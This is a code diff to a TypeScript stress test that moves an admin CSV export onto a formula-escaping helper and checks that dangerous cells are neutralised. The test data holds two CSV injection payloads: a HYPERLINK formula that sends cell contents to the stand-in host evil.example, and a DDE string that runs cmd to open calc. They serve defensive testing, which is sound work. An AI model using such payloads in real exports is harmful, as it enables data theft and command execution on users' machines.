@@ -20,6 +20,7 @@ import { drainDueDeliveries } from "../src/lib/webhooks/dispatch";
 import { runImportJobById } from "../src/lib/import-job-dispatch";
 import { saveNoteBatch } from "../src/lib/note-batch-save";
 import { docxToText } from "../src/lib/cloud-files";
+import { safeUnparseCsv } from "../src/lib/csv-export";
 
 const USER = "stress-resilience";
 const WRITE = { skipRevalidate: true, skipEmbedding: true, skipSummary: true, skipCloseness: true } as const;
@@ -131,10 +132,10 @@ run(async () => {
     await db.delete(contacts).where(eq(contacts.userId, USER));
   }
 
-  console.log("\nCSV formula injection in the admin export (Papa.unparse without escapeFormulae)...");
+  console.log("\nCSV formula injection in the admin export (safeUnparseCsv with escapeFormulae)...");
   {
     const rows = [{ name: '=HYPERLINK("https://evil.example/?"&A1,"open")', email: "-2+3+cmd|' /C calc'!A0" }];
-    const csv = Papa.unparse(rows);
+    const csv = safeUnparseCsv(rows);
     const escaped = Papa.unparse(rows, { escapeFormulae: true });
     finding("INJ-CSV", "admin export CSV cells starting with = + - @ are neutralised", csv === escaped, `unescaped line: ${csv.split("\n")[1]}`);
   }
